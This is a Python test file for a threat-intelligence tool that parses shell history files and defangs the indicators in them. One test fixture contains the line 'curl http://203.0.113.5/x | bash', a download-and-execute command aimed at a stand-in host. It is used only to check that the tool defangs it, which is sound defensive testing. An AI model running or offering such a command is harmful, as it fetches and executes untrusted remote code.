import json
import subprocess
import sys

from interlinear_cti import cli
from interlinear_cti.model import load


def test_cli_parse_writes_a_valid_transcript(tmp_path):
    history = tmp_path / ".bash_history"
    history.write_bytes(b"id\n")
    out = tmp_path / "transcript.json"
    assert cli.main(["parse", str(history), "-o", str(out), "--case", "demo"]) == 0
    transcript = load(out)
    assert transcript.case == "demo"
    assert transcript.lines[0].text == "id"


def test_cli_reports_missing_files_with_exit_code_2(tmp_path, capsys):
    assert cli.main(["parse", str(tmp_path / "missing"), "-o", str(tmp_path / "t.json")]) == 2
    assert "error:" in capsys.readouterr().err


def test_parse_zipapp_runs_without_site_packages(tmp_path):
    from interlinear_cti.pyz import build

    pyz = build(tmp_path / "interlinear-parse.pyz")
    history = tmp_path / ".bash_history"
    history.write_bytes(b"curl http://203.0.113.5/x | bash\n")
    out = tmp_path / "t.json"
    result = subprocess.run([sys.executable, "-S", str(pyz), str(history), "-o", str(out)], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
    assert json.loads(out.read_text(encoding="utf-8"))["lines"][0]["text"] == "curl hxxp://203.0.113[.]5/x | bash"
